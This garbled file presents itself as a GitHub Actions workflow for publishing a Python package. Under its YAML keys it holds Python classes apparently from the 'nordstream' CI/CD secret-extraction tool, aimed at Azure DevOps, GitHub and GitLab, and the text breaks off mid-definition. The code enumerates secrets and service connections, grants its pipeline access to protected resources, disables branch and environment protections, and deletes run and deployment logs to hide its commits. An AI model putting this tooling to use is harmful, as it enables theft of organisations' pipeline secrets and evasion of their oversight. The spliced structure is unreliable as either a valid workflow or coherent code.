# This workflow will upload a Python Package to PyPI when a release is created
# For more information see: https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-python#publishing-to-package-registries

# This workflow uses actions that are not certified by GitHub.
# They are provided by a third-party and are governed by
# separate terms of service, privacy policy, and support
# documentation.

name: Upload Python Package

on: import requests
import time
from os import makedirs
from nordstream.utils.log import logger
from nordstream.yaml.devops import DevOpsPipelineGenerator
from nordstream.git import Git
from nordstream.utils.errors import DevOpsError
from nordstream.utils.constants import *
from nordstream.utils.helpers import isAZDOBearerToken

# painfull warnings you know what you are doing right ?
requests.packages.urllib3.disable_warnings()


class DevOps:
    _DEFAULT_PIPELINE_NAME = DEFAULT_PIPELINE_NAME
    _DEFAULT_BRANCH_NAME = DEFAULT_BRANCH_NAME
    _token = None
    _auth = None
    _org = None
    _devopsLoginId = None
    _projects = []
    _baseURL = "https://dev.azure.com/"
    _header = {
        "Accept": "application/json; api-version=6.0-preview",
        "User-Agent": USER_AGENT,
    }
    _session = None
    _repoName = DEFAULT_REPO_NAME
    _outputDir = OUTPUT_DIR
    _pipelineName = _DEFAULT_PIPELINE_NAME
    _branchName = _DEFAULT_BRANCH_NAME
    _sleepTime = 15
    _maxRetry = 10

    def __init__(self, token, org, verifCert):
        self._token = token
        self._org = org
        self._baseURL += f"{org}/"
        self._session = requests.Session()
        self.setCookiesAndHeaders()
        self._session.verify = verifCert
        self._devopsLoginId = self.__getLogin()

    @property
    def projects(self):
        return self._projects

    @property
    def org(self):
        return self._org

    @property
    def branchName(self):
        return self._branchName

    @branchName.setter
    def branchName(self, value):
        self._branchName = value

    @property
    def repoName(self):
        return self._repoName

    @repoName.setter
    def repoName(self, value):
        self._repoName = value

    @property
    def pipelineName(self):
        return self._pipelineName

    @pipelineName.setter
    def pipelineName(self, value):
        self._pipelineName = value

    @property
    def token(self):
        return self._token

    @property
    def outputDir(self):
        return self._outputDir

    @outputDir.setter
    def outputDir(self, value):
        self._outputDir = value

    @property
    def defaultPipelineName(self):
        return self._DEFAULT_PIPELINE_NAME

    @property
    def defaultBranchName(self):
        return self._DEFAULT_BRANCH_NAME

    def __getLogin(self):
        return self.getUser().get("authenticatedUser").get("id")

    def getUser(self):
        logger.debug("Retrieving user informations")
        return self._session.get(
            f"{self._baseURL}/_apis/ConnectionData",
        ).json()

    def setCookiesAndHeaders(self):
        if isAZDOBearerToken(self._token):
            self._session.headers.update({"Authorization": f"Bearer {self._token}"})
        else:
            self._session.auth = ("", self._token)
        self._session.headers.update(self._header)

    def listProjects(self):
        logger.debug("Listing projects")
        continuationToken = 0
        # Azure DevOps pagination
        while True:
            params = {"continuationToken": continuationToken}
            response = self._session.get(
                f"{self._baseURL}/_apis/projects",
                params=params,
            ).json()

            if len(response.get("value")) != 0:
                for repo in response.get("value"):
                    p = {"id": repo.get("id"), "name": repo.get("name")}
                    self._projects.append(p)
                continuationToken += response.get("count")
            else:
                break

    def listUsers(self):
        logger.debug("Listing users")
        continuationToken = None
        res = []
        params = {}
        # Azure DevOps pagination
        while True:
            if continuationToken:
                params = {"continuationToken": continuationToken}
            response = self._session.get(
                f"https://vssps.dev.azure.com/{self._org}/_apis/graph/users",
                params=params,
            )

            headers = response.headers
            response = response.json()

            if len(response.get("value")) != 0:
                for user in response.get("value"):
                    p = {
                        "origin": user.get("origin"),
                        "displayName": user.get("displayName"),
                        "mailAddress": user.get("mailAddress"),
                    }
                    res.append(p)
                continuationToken = headers.get("x-ms-continuationtoken", None)
                if not continuationToken:
                    break
            else:
                break
        return res

    # TODO: crappy code I know
    def filterWriteProjects(self):
        continuationToken = None
        res = []
        params = {}
        # Azure DevOps pagination
        while True:
            if continuationToken:
                params = {"continuationToken": continuationToken}
            response = self._session.get(
                f"https://vssps.dev.azure.com/{self._org}/_apis/graph/groups",
                params=params,
            )

            headers = response.headers
            response = response.json()

            if len(response.get("value")) != 0:
                for project in self._projects:
                    for group in response.get("value"):
                        name = project.get("name")
                        if self.__checkProjectPrivs(self._devopsLoginId, name, group):
                            duplicate = False
                            for p in res:
                                if p.get("id") == project.get("id"):
                                    duplicate = True
                            if not duplicate:
                                res.append(project)

                continuationToken = headers.get("x-ms-continuationtoken", None)
                if not continuationToken:
                    break

            else:
                break
        self._projects = res

    def __checkProjectPrivs(self, login, projectName, group):
        groupPrincipalName = group.get("principalName")

        writeGroups = [
            f"[{projectName}]\\{projectName} Team",
            f"[{projectName}]\\Contributors",
            f"[{projectName}]\\Project Administrators",
        ]
        pagingToken = None
        params = {}

        for g in writeGroups:
            if groupPrincipalName == g:
                originId = group.get("originId")
                while True:
                    if pagingToken:
                        params = {"pagingToken": pagingToken}
                    response = self._session.get(
                        f"https://vsaex.dev.azure.com/{self._org}/_apis/GroupEntitlements/{originId}/members",
                        params=params,
                    ).json()

                    pagingToken = response.get("continuationToken")
                    if len(response.get("items")) != 0:
                        for user in response.get("items"):
                            if user.get("id") == login:
                                return True

                    else:
                        return False

    def listRepositories(self, project):
        logger.debug("Listing repositories")
        response = self._session.get(
            f"{self._baseURL}/{project}/_apis/git/repositories",
        ).json()
        return response.get("value")

    def listPipelines(self, project):
        logger.debug("Listing pipelines")
        response = self._session.get(
            f"{self._baseURL}/{project}/_apis/pipelines",
        ).json()
        return response.get("value")

    def addProject(self, project):
        logger.debug(f"Checking project: {project}")

        response = self._session.get(
            f"{self._baseURL}/_apis/projects/{project}",
        ).json()

        if response.get("id"):
            p = {"id": response.get("id"), "name": response.get("name")}
            self._projects.append(p)

    @classmethod
    def checkToken(cls, token, org, verifCert):
        logger.verbose(f"Checking token: {token}")
        try:
            return (
                requests.get(
                    f"https://dev.azure.com/{org}/_apis/ConnectionData",
                    auth=("foo", token),
                    verify=verifCert,
                ).status_code
                == 200
            )
        except Exception as e:
            logger.error(e)
            return False

    def listProjectVariableGroupsSecrets(self, project):
        logger.debug(f"Listing variable groups for: {project}")
        response = self._session.get(
            f"{self._baseURL}/{project}/_apis/distributedtask/variablegroups",
        )

        if response.status_code != 200:
            raise DevOpsError("Can't list variable groups secrets.")

        response = response.json()

        res = []

        if response.get("count", 0) != 0:
            for variableGroup in response.get("value"):
                name = variableGroup.get("name")
                id = variableGroup.get("id")
                variables = []
                for var in variableGroup.get("variables").keys():
                    variables.append(var)
                res.append({"name": name, "id": id, "variables": variables})
        return res

    def listProjectSecureFiles(self, project):
        logger.debug(f"Listing secure files for: {project}")
        response = self._session.get(
            f"{self._baseURL}/{project}/_apis/distributedtask/securefiles",
        )

        if response.status_code != 200:
            raise DevOpsError("Can't list secure files.")

        response = response.json()

        res = []

        if response["count"]:
            for secureFile in response["value"]:
                res.append({"name": secureFile["name"], "id": secureFile["id"]})
        return res

    def authorizePipelineForResourceAccess(self, projectId, pipelineId, resource, resourceType):
        resourceId = resource["id"]

        logger.debug(f"Checking current pipeline permissions for: \"{resource['name']}\"")
        response = self._session.get(
            f"{self._baseURL}/{projectId}/_apis/pipelines/pipelinePermissions/{resourceType}/{resourceId}",
        ).json()

        allPipelines = response.get("allPipelines")
        if allPipelines and allPipelines.get("authorized"):
            return True

        for pipeline in response.get("pipelines"):
            if pipeline.get("id") == pipelineId:
                return True

        logger.debug(f"\"{resource['name']}\" has restricted permissions. Adding access permissions for the pipeline")
        response = self._session.patch(
            f"{self._baseURL}/{projectId}/_apis/pipelines/pipelinePermissions/{resourceType}/{resourceId}",
            json={"pipelines": [{"id": pipelineId, "authorized": True}]},
        )

        if response.status_code != 200:
            logger.error(f"Error: unable to give the custom pipeline access to {resourceType}: \"{resource['name']}\"")
            return False
        return True

    def createGit(self, project):
        logger.debug(f"Creating git repo for: {project}")
        data = {"name": self._repoName, "project": {"id": project}}
        response = self._session.post(
            f"{self._baseURL}/{project}/_apis/git/repositories",
            json=data,
        ).json()

        return response

    def deleteGit(self, project, repoId):
        logger.debug(f"Deleting git repo for: {project}")
        response = self._session.delete(
            f"{self._baseURL}/{project}/_apis/git/repositories/{repoId}",
        )
        return response.status_code == 204

    def createPipeline(self, project, repoId, path):
        logger.debug("creating pipeline")
        data = {
            "folder": None,
            "name": self._pipelineName,
            "configuration": {
                "type": "yaml",
                "path": path,
                "repository": {
                    "id": repoId,
                    "type": "azureReposGit",
                    "defaultBranch": self._branchName,
                },
            },
        }
        response = self._session.post(
            f"{self._baseURL}/{project}/_apis/pipelines",
            json=data,
        ).json()
        return response.get("id")

    def runPipeline(self, project, pipelineId):
        logger.debug(f"Running pipeline: {pipelineId}")
        params = {
            "definition": {"id": pipelineId},
            "sourceBranch": f"refs/heads/{self._branchName}",
        }

        response = self._session.post(
            f"{self._baseURL}/{project}/_apis/build/Builds",
            json=params,
        ).json()

        return response

    def __getBuilds(self, project):
        logger.debug(f"Getting builds.")

        return (
            self._session.get(
                f"{self._baseURL}/{project}/_apis/build/Builds",
            )
            .json()
            .get("value")
        )

    def __getBuildSources(self, project, buildId):

        return self._session.get(
            f"{self._baseURL}/{project}/_apis/build/Builds/{buildId}/sources",
        ).json()

    def getRunId(self, project, pipelineId):
        logger.debug(f"Getting RunId for pipeline: {pipelineId}")

        for i in range(self._maxRetry):

            # Don't wait first time
            if i != 0:
                logger.warning(f"Run not available, sleeping for {self._sleepTime}s")
                time.sleep(self._sleepTime)

            for build in self.__getBuilds(project):

                if build.get("definition").get("id") == pipelineId:

                    buildId = build.get("id")
                    buildSource = self.__getBuildSources(project, buildId)

                    if (
                        buildSource.get("comment") == Git.ATTACK_COMMIT_MSG
                        and buildSource.get("author").get("email") == Git.EMAIL
                    ):
                        return buildId

            if i == (self._maxRetry):
                logger.error("Error: run still not ready.")

        return None

    def waitPipeline(self, project, pipelineId, runId):
        logger.info("Getting pipeline output")

        for i in range(self._maxRetry):

            if i != 0:
                logger.warning(f"Pipeline still running, sleeping for {self._sleepTime}s")
                time.sleep(self._sleepTime)

            response = self._session.get(
                f"{self._baseURL}/{project}/_apis/pipelines/{pipelineId}/runs/{runId}",
                json={},
            ).json()

            if response.get("state") == "completed":
                return response.get("result")
            if i == (self._maxRetry - 1):
                logger.error("Error: pipeline still not finished.")

        return None

    def __createPipelineOutputDir(self, projectName):
        makedirs(f"{self._outputDir}/{self._org}/{projectName}", exist_ok=True)

    def downloadPipelineOutput(self, projectId, runId):
        self.__createPipelineOutputDir(projectId)

        for i in range(self._maxRetry):

            if i != 0:
                logger.warning(f"Output not ready, sleeping for {self._sleepTime}s")
                time.sleep(self._sleepTime)

            buildTimeline = self._session.get(
                f"{self._baseURL}/{projectId}/_apis/build/builds/{runId}/timeline",
                json={},
            ).json()

            logs = [
                record["log"]["id"]
                for record in buildTimeline["records"]
                if record["name"] == DevOpsPipelineGenerator.taskName
            ]
            if len(logs) != 0:
                break

            # if there are logs but we didn't find the taskName get the last
            # job as it contain all data
            if len(buildTimeline["records"]) > 0:
                logs = [buildTimeline["records"][-1]["log"]["id"]]
                break

            if i == (self._maxRetry - 1):
                logger.error("Output still no ready, error !")
                return None

        logId = logs[0]

        logger.debug(f"Log ID of the extraction task: {logId}")

        for i in range(self._maxRetry):

            if i != 0:
                logger.warning(f"Output not ready, sleeping for {self._sleepTime}s")
                time.sleep(self._sleepTime)

            logOutput = self._session.get(
                f"{self._baseURL}/{projectId}/_apis/build/builds/{runId}/logs/{logId}",
                json={},
            ).json()
            if len(logOutput.get("value")) != 0:
                break
            if i == (self._maxRetry - 1):
                logger.error("Output still no ready, error !")
                return None

        date = time.strftime("%Y-%m-%d_%H-%M-%S")
        with open(f"{self._outputDir}/{self._org}/{projectId}/pipeline_{date}.log", "w") as f:
            for line in logOutput.get("value"):
                f.write(line + "\n")
        f.close()
        return f"pipeline_{date}.log"

    def __cleanRunLogs(self, projectId):
        logger.verbose("Cleaning run logs.")

        builds = self.__getBuilds(projectId)

        if len(builds) != 0:
            for build in builds:

                buildId = build.get("id")
                buildSource = self.__getBuildSources(projectId, buildId)

                if (
                    buildSource.get("comment") == (Git.ATTACK_COMMIT_MSG or Git.CLEAN_COMMIT_MSG)
                    and buildSource.get("author").get("email") == Git.EMAIL
                ):
                    return buildId

                self._session.delete(
                    f"{self._baseURL}/{projectId}/_apis/build/builds/{buildId}",
                )

    def __cleanPipeline(self, projectId):
        logger.verbose(f"Removing pipeline.")

        response = self._session.get(
            f"{self._baseURL}/{projectId}/_apis/pipelines",
        ).json()
        if response.get("count", 0) != 0:
            for pipeline in response.get("value"):
                if pipeline.get("name") == self._pipelineName:
                    pipelineId = pipeline.get("id")
                    self._session.delete(
                        f"{self._baseURL}/{projectId}/_apis/pipelines/{pipelineId}",
                    )

    def deletePipeline(self, projectId):
        logger.debug("Deleting pipeline")
        response = self._session.get(
            f"{self._baseURL}/{projectId}/_apis/build/Definitions",
            json={},
        ).json()
        if response.get("count", 0) != 0:
            for pipeline in response.get("value"):
                if pipeline.get("name") == self._pipelineName:
                    definitionId = pipeline.get("id")
                    self._session.delete(
                        f"{self._baseURL}/{projectId}/_apis/build/definitions/{definitionId}",
                        json={},
                    )

    def cleanAllLogs(self, projectId):
        self.__cleanRunLogs(projectId)

    def listServiceConnections(self, projectId):
        logger.debug("Listing service connections")
        res = []
        response = self._session.get(
            f"{self._baseURL}/{projectId}/_apis/serviceendpoint/endpoints",
            json={},
        )

        if response.status_code != 200:
            raise DevOpsError("Can't list service connections.")

        response = response.json()

        if response.get("count", 0) != 0:
            res = response.get("value")
        return res

    def getFailureReason(self, projectId, runId):
        res = []

        response = self._session.get(
            f"{self._baseURL}/{projectId}/_apis/build/builds/{runId}",
        ).json()
        for result in response.get("validationResults"):
            res.append(result.get("message"))

        try:
            timeline = self._session.get(
                f"{self._baseURL}/{projectId}/_apis/build/builds/{runId}/Timeline",
            ).json()
            for record in timeline.get("records", []):
                if record.get("issues"):
                    for issue in record.get("issues"):
                        res.append(issue.get("message"))
        except:
            pass
        return res 
  release: import requests
import time
from os import makedirs
import urllib.parse
from nordstream.utils.errors import GitHubError, GitHubBadCredentials
from nordstream.utils.log import logger
from nordstream.git import Git
from nordstream.utils.constants import *


class GitHub:
    _DEFAULT_BRANCH_NAME = DEFAULT_BRANCH_NAME
    _token = None
    _auth = None
    _org = None
    _githubLogin = None
    _repos = []
    _header = {
        "Accept": "application/vnd.github+json",
        "User-Agent": USER_AGENT,
    }
    _repoURL = "https://api.github.com/repos"
    _session = None
    _branchName = _DEFAULT_BRANCH_NAME
    _outputDir = OUTPUT_DIR
    _sleepTime = 15
    _maxRetry = 10
    _isGHSToken = False

    def __init__(self, token):
        self._token = token
        self._auth = ("foo", self._token)
        self._session = requests.Session()
        if token.lower().startswith("ghs_"):
            self._isGHSToken = True

        self._githubLogin = self.__getLogin()

    @staticmethod
    def checkToken(token):
        logger.verbose(f"Checking token: {token}")

        headers = GitHub._header
        headers["Authorization"] = f"token {token}"

        data = {"query": "query UserCurrent{viewer{login}}"}

        return requests.post("https://api.github.com/graphql", headers=headers, json=data).status_code == 200

    @property
    def token(self):
        return self._token

    @property
    def org(self):
        return self._org

    @org.setter
    def org(self, org):
        self._org = org

    @property
    def defaultBranchName(self):
        return self._DEFAULT_BRANCH_NAME

    @property
    def branchName(self):
        return self._branchName

    @branchName.setter
    def branchName(self, value):
        self._branchName = value

    @property
    def repos(self):
        return self._repos

    @property
    def outputDir(self):
        return self._outputDir

    @outputDir.setter
    def outputDir(self, value):
        self._outputDir = value

    def __getLogin(self):
        return self.getLoginWithGraphQL().json().get("data").get("viewer").get("login")

    def getUser(self):
        logger.debug("Retrieving user informations")
        return self._session.get(f"https://api.github.com/user", auth=self._auth, headers=self._header)

    def getLoginWithGraphQL(self):
        logger.debug("Retrieving identity with GraphQL")

        headers = self._header
        headers["Authorization"] = f"token {self._token}"

        data = {"query": "query UserCurrent{viewer{login}}"}

        return self._session.post("https://api.github.com/graphql", headers=headers, json=data)

    def __paginatedGet(self, url, data="", maxData=0):

        page = 1
        res = []
        while True:

            params = {"page": page}

            response = self._session.get(
                url,
                params=params,
                auth=self._auth,
                headers=self._header,
            ).json()

            if not isinstance(response, list) and response.get("message", None):
                if response.get("message") == "Bad credentials":
                    raise GitHubBadCredentials(response.get("message"))
                elif response.get("message") != "Not Found":
                    raise GitHubError(response.get("message"))
                return res

            if (data != "" and len(response.get(data)) == 0) or (data == "" and len(response) == 0):
                break

            if data != "" and len(response.get(data)) != 0:
                res.extend(response.get(data, []))

            if data == "" and len(response) != 0:
                res.extend(response)

            if maxData != 0 and len(res) >= maxData:
                break

            page += 1

        return res

    def listRepos(self):
        logger.debug("Listing repos")

        if self._isGHSToken:
            url = f"https://api.github.com/orgs/{self._org}/repos"
        else:
            url = f"https://api.github.com/user/repos"

        response = self.__paginatedGet(url)

        for repo in response:
            # filter for specific org
            if self._org:
                if self._org.lower() == repo.get("owner").get("login").lower():
                    self._repos.append(repo.get("full_name"))
            else:
                self._repos.append(repo.get("full_name"))

    def addRepo(self, repo):
        logger.debug(f"Checking repo: {repo}")
        if self._org:
            full_name = self._org + "/" + repo
        else:
            # if no org, must provide repo as 'org/repo'
            # FIXME: This cannot happen at the moment because --org argument is required
            if len(repo.split("/")) == 2:
                full_name = repo
            else:
                # FIXME: Raise an Exception here
                logger.error("Invalid repo name: {repo}")

        response = self._session.get(
            f"{self._repoURL}/{full_name}",
            auth=self._auth,
            headers=self._header,
        ).json()

        if response.get("message", None) and response.get("message") == "Bad credentials":
            raise GitHubBadCredentials(response.get("message"))

        if response.get("id"):
            self._repos.append(response.get("full_name"))

    def listEnvFromrepo(self, repo):
        logger.debug(f"Listing environment secret from repo: {repo}")
        res = []
        response = self.__paginatedGet(f"{self._repoURL}/{repo}/environments", data="environments")

        for env in response:
            res.append(env.get("name"))
        return res

    def listSecretsFromEnv(self, repo, env):
        logger.debug(f"Getting environment secrets for {repo}: {env}")
        envReq = urllib.parse.quote(env, safe="")
        res = []

        response = self.__paginatedGet(f"{self._repoURL}/{repo}/environments/{envReq}/secrets", data="secrets")

        for sec in response:
            res.append(sec.get("name"))

        return res

    def listSecretsFromRepo(self, repo):
        res = []

        response = self.__paginatedGet(f"{self._repoURL}/{repo}/actions/secrets", data="secrets")

        for sec in response:
            res.append(sec.get("name"))

        return res

    def listOrganizationSecretsFromRepo(self, repo):
        res = []

        response = self.__paginatedGet(f"{self._repoURL}/{repo}/actions/organization-secrets", data="secrets")

        for sec in response:
            res.append(sec.get("name"))

        return res

    def listDependabotSecretsFromRepo(self, repo):
        res = []

        response = self.__paginatedGet(f"{self._repoURL}/{repo}/dependabot/secrets", data="secrets")

        for sec in response:
            res.append(sec.get("name"))

        return res

    def listDependabotOrganizationSecrets(self):
        res = []

        response = self.__paginatedGet(f"https://api.github.com/orgs/{self._org}/dependabot/secrets", data="secrets")

        for sec in response:
            res.append(sec.get("name"))

        return res

    def listEnvProtections(self, repo, env):
        logger.debug("Getting environment protections")
        envReq = urllib.parse.quote(env, safe="")
        res = []
        response = requests.get(
            f"{self._repoURL}/{repo}/environments/{envReq}",
            auth=self._auth,
            headers=self._header,
        ).json()

        for protection in response.get("protection_rules"):
            protectionType = protection.get("type")
            res.append(protectionType)

        return res

    def getEnvDetails(self, repo, env):
        envReq = urllib.parse.quote(env, safe="")
        response = self._session.get(
            f"{self._repoURL}/{repo}/environments/{envReq}",
            auth=self._auth,
            headers=self._header,
        ).json()

        if response.get("message"):
            raise GitHubError(response.get("message"))
        return response

    def createDeploymentBranchPolicy(self, repo, env):
        envReq = urllib.parse.quote(env, safe="")
        logger.debug(f"Adding new branch policy for {self._branchName} on {envReq}")

        data = {"name": f"{self._branchName}"}
        response = self._session.post(
            f"{self._repoURL}/{repo}/environments/{envReq}/deployment-branch-policies",
            json=data,
            auth=self._auth,
            headers=self._header,
        ).json()

        if response.get("message"):
            raise GitHubError(response.get("message"))

        policyId = response.get("id")
        logger.debug(f"Branch policy id: {policyId}")
        return policyId

    def deleteDeploymentBranchPolicy(self, repo, env):
        logger.debug("Delete deployment branch policy")
        envReq = urllib.parse.quote(env, safe="")
        response = self._session.get(
            f"{self._repoURL}/{repo}/environments/{envReq}",
            auth=self._auth,
            headers=self._header,
        ).json()

        if response.get("deployment_branch_policy") is not None:
            response = self._session.get(
                f"{self._repoURL}/{repo}/environments/{envReq}/deployment-branch-policies",
                auth=self._auth,
                headers=self._header,
            ).json()

            for policy in response.get("branch_policies"):
                if policy.get("name").lower() == self._branchName.lower():
                    logger.verbose(f"Deleting branch policy for {self._branchName} on {envReq}")
                    policyId = policy.get("id")
                    self._session.delete(
                        f"{self._repoURL}/{repo}/environments/{envReq}/deployment-branch-policies/{policyId}",
                        auth=self._auth,
                        headers=self._header,
                    )

    def disableBranchProtectionRules(self, repo):
        logger.debug("Modifying branch protection")
        response = self._session.get(
            f"{self._repoURL}/{repo}/branches/{urllib.parse.quote(self._branchName)}",
            auth=self._auth,
            headers=self._header,
        ).json()

        if response.get("name") and response.get("protected"):
            data = {
                "required_status_checks": None,
                "enforce_admins": False,
                "required_pull_request_reviews": None,
                "restrictions": None,
                "allow_deletions": True,
                "allow_force_pushes": True,
            }
            self._session.put(
                f"{self._repoURL}/{repo}/branches/{urllib.parse.quote(self._branchName)}/protection",
                json=data,
                auth=self._auth,
                headers=self._header,
            )

    def modifyEnvProtectionRules(self, repo, env, wait, reviewers, branchPolicy):
        data = {
            "wait_timer": wait,
            "reviewers": reviewers,
            "deployment_branch_policy": branchPolicy,
        }
        envReq = urllib.parse.quote(env, safe="")
        response = self._session.put(
            f"{self._repoURL}/{repo}/environments/{envReq}",
            json=data,
            auth=self._auth,
            headers=self._header,
        ).json()

        if response.get("message"):
            raise GitHubError(response.get("message"))
        return response

    def deleteDeploymentBranchPolicyForAllEnv(self, repo):
        allEnv = self.listEnvFromrepo(repo)
        for env in allEnv:
            self.deleteDeploymentBranchPolicy(repo, env)

    def checkBranchProtectionRules(self, repo):
        response = self._session.get(
            f"{self._repoURL}/{repo}/branches/{urllib.parse.quote(self._branchName)}",
            auth=self._auth,
            headers=self._header,
        ).json()
        if response.get("message"):
            raise GitHubError(response.get("message"))
        return response.get("protected")

    def getBranchesProtectionRules(self, repo):
        logger.debug("Getting branch protection rules")
        response = self._session.get(
            f"{self._repoURL}/{repo}/branches/{urllib.parse.quote(self._branchName)}/protection",
            auth=self._auth,
            headers=self._header,
        ).json()
        if response.get("message"):
            return None
        return response

    def updateBranchesProtectionRules(self, repo, protections):
        logger.debug("Updating branch protection rules")

        response = self._session.put(
            f"{self._repoURL}/{repo}/branches/{urllib.parse.quote(self._branchName)}/protection",
            auth=self._auth,
            headers=self._header,
            json=protections,
        ).json()

        return response

    def cleanDeploymentsLogs(self, repo):
        logger.verbose(f"Cleaning deployment logs from: {repo}")
        url = f"{self._repoURL}/{repo}/deployments?ref={urllib.parse.quote(self._branchName)}"
        response = self.__paginatedGet(url, maxData=200)

        for deployment in response:
            if not self._isGHSToken and deployment.get("creator").get("login").lower() != self._githubLogin.lower():
                continue

            commit = self._session.get(
                f"{self._repoURL}/{repo}/commits/{deployment['sha']}", auth=self._auth, headers=self._header
            ).json()

            # We want to delete only our action so we must filter some attributes
            if commit["commit"]["message"] not in [Git.ATTACK_COMMIT_MSG, Git.CLEAN_COMMIT_MSG]:
                continue

            if commit["commit"]["committer"]["name"] != Git.USER:
                continue

            if commit["commit"]["committer"]["email"] != Git.EMAIL:
                continue

            deploymentId = deployment.get("id")
            data = {"state": "inactive"}
            self._session.post(
                f"{self._repoURL}/{repo}/deployments/{deploymentId}/statuses",
                json=data,
                auth=self._auth,
                headers=self._header,
            )
            self._session.delete(
                f"{self._repoURL}/{repo}/deployments/{deploymentId}",
                auth=self._auth,
                headers=self._header,
            )

    def cleanRunLogs(self, repo, workflowFilename):
        logger.verbose(f"Cleaning run logs from: {repo}")
        url = f"{self._repoURL}/{repo}/actions/runs?branch={urllib.parse.quote(self._branchName)}"

        if not self._isGHSToken:
            url += f"&actor={self._githubLogin.lower()}"

        # we dont scan for all the logs we only check the last 200
        response = self.__paginatedGet(url, data="workflow_runs", maxData=200)

        for run in response:

            # skip if it's not our commit
            if run.get("head_commit").get("message") not in [Git.ATTACK_COMMIT_MSG, Git.CLEAN_COMMIT_MSG]:
                continue

            committer = run.get("head_commit").get("committer")
            if committer.get("name") != Git.USER:
                continue

            if committer.get("email") != Git.EMAIL:
                continue

            runId = run.get("id")
            status = (
                self._session.get(
                    f"{self._repoURL}/{repo}/actions/runs/{runId}",
                    json={},
                    auth=self._auth,
                    headers=self._header,
                )
                .json()
                .get("status")
            )

            if status != "completed":
                self._session.post(
                    f"{self._repoURL}/{repo}/actions/runs/{runId}/cancel",
                    json={},
                    auth=self._auth,
                    headers=self._header,
                )
                status = (
                    self._session.get(
                        f"{self._repoURL}/{repo}/actions/runs/{runId}",
                        json={},
                        auth=self._auth,
                        headers=self._header,
                    )
                    .json()
                    .get("status")
                )
                if status != "completed":
                    for i in range(self._maxRetry):
                        time.sleep(2)
                        status = (
                            self._session.get(
                                f"{self._repoURL}/{repo}/actions/runs/{runId}",
                                json={},
                                auth=self._auth,
                                headers=self._header,
                            )
                            .json()
                            .get("status")
                        )
                        if status == "completed":
                            break

            self._session.delete(
                f"{self._repoURL}/{repo}/actions/runs/{runId}/logs",
                auth=self._auth,
                headers=self._header,
            )
            self._session.delete(
                f"{self._repoURL}/{repo}/actions/runs/{runId}",
                auth=self._auth,
                headers=self._header,
            )

    def cleanAllLogs(self, repo, workflowFilename):
        logger.debug(f"Cleaning logs for: {repo}")
        self.cleanRunLogs(repo, workflowFilename)
        self.cleanDeploymentsLogs(repo)

    def createWorkflowOutputDir(self, repo):
        outputName = repo.split("/")
        makedirs(f"{self._outputDir}/{outputName[0]}/{outputName[1]}", exist_ok=True)

    def waitWorkflow(self, repo, workflowFilename):
        logger.info("Getting workflow output")

        time.sleep(5)
        workflowFilename = urllib.parse.quote_plus(workflowFilename)
        response = self._session.get(
            f"{self._repoURL}/{repo}/actions/workflows/{workflowFilename}/runs?branch={urllib.parse.quote(self._branchName)}",
            auth=self._auth,
            headers=self._header,
        ).json()

        if response.get("total_count", 0) == 0:
            for i in range(self._maxRetry):
                logger.warning(f"Workflow not started, sleeping for {self._sleepTime}s")
                time.sleep(self._sleepTime)
                response = self._session.get(
                    f"{self._repoURL}/{repo}/actions/workflows/{workflowFilename}/runs?branch={urllib.parse.quote(self._branchName)}",
                    auth=self._auth,
                    headers=self._header,
                ).json()
                if response.get("total_count", 0) != 0:
                    break
                if i == (self._maxRetry - 1):
                    logger.error("Error: workflow still not started.")
                    return None, None

        if response.get("workflow_runs")[0].get("status") != "completed":
            for i in range(self._maxRetry):
                logger.warning(f"Workflow not finished, sleeping for {self._sleepTime}s")
                time.sleep(self._sleepTime)
                response = self._session.get(
                    f"{self._repoURL}/{repo}/actions/workflows/{workflowFilename}/runs?branch={urllib.parse.quote(self._branchName)}",
                    auth=self._auth,
                    headers=self._header,
                ).json()
                if response.get("workflow_runs")[0].get("status") == "completed":
                    break
                if i == (self._maxRetry - 1):
                    logger.error("Error: workflow still not finished.")

        return (
            response.get("workflow_runs")[0].get("id"),
            response.get("workflow_runs")[0].get("conclusion"),
        )

    def downloadWorkflowOutput(self, repo, name, workflowId):
        self.createWorkflowOutputDir(repo)

        zipFile = self._session.get(
            f"{self._repoURL}/{repo}/actions/runs/{workflowId}/logs",
            auth=self._auth,
            headers=self._header,
        )

        date = time.strftime("%Y-%m-%d_%H-%M-%S")
        with open(f"{self._outputDir}/{repo}/workflow_{name}_{date}.zip", "wb") as f:
            f.write(zipFile.content)
        f.close()
        return f"workflow_{name}_{date}.zip"

    def getFailureReason(self, repo, workflowId):
        res = []
        workflow = self._session.get(
            f"{self._repoURL}/{repo}/actions/runs/{workflowId}",
            auth=self._auth,
            headers=self._header,
        ).json()
        checkSuiteId = workflow.get("check_suite_id")
        checkRuns = self._session.get(
            f"{self._repoURL}/{repo}/check-suites/{checkSuiteId}/check-runs",
            auth=self._auth,
            headers=self._header,
        ).json()

        if checkRuns.get("total_count"):
            for checkRun in checkRuns.get("check_runs"):
                checkRunId = checkRun.get("id")
                annotations = self._session.get(
                    f"{self._repoURL}/{repo}/check-runs/{checkRunId}/annotations",
                    auth=self._auth,
                    headers=self._header,
                ).json()
                for annotation in annotations:
                    res.append(annotation.get("message"))
        return res

    def filterWriteRepos(self):
        res = []
        for repo in self._repos:
            try:
                self.listSecretsFromRepo(repo)
                res.append(repo)
            except GitHubError:
                pass
        self._repos = res

    def isGHSToken(self):
        return self._isGHSToken 
    types: import requests
import time
import re
from os import makedirs
from nordstream.utils.log import logger
from nordstream.utils.errors import GitLabError
from nordstream.git import Git
from nordstream.utils.constants import *
from nordstream.utils.helpers import isGitLabSessionCookie

# painfull warnings you know what you are doing right ?
requests.packages.urllib3.disable_warnings()


class GitLab:
    _DEFAULT_BRANCH_NAME = DEFAULT_BRANCH_NAME
    _auth = None
    _session = None
    _token = None
    _projects = []
    _groups = []
    _outputDir = OUTPUT_DIR
    _headers = {
        "User-Agent": USER_AGENT,
    }
    _cookies = {}
    _gitlabURL = None
    _branchName = _DEFAULT_BRANCH_NAME
    _sleepTime = 15
    _maxRetry = 10

    def __init__(self, url, token, verifCert):
        self._gitlabURL = url.strip("/")
        self._token = token
        self._session = requests.Session()
        self._session.verify = verifCert
        self.setCookiesAndHeaders()
        self._gitlabLogin = self.__getLogin()

    @property
    def projects(self):
        return self._projects

    @property
    def groups(self):
        return self._groups

    @property
    def token(self):
        return self._token

    @property
    def url(self):
        return self._gitlabURL

    @property
    def outputDir(self):
        return self._outputDir

    @outputDir.setter
    def outputDir(self, value):
        self._outputDir = value

    @property
    def defaultBranchName(self):
        return self._DEFAULT_BRANCH_NAME

    @property
    def branchName(self):
        return self._branchName

    @branchName.setter
    def branchName(self, value):
        self._branchName = value

    @classmethod
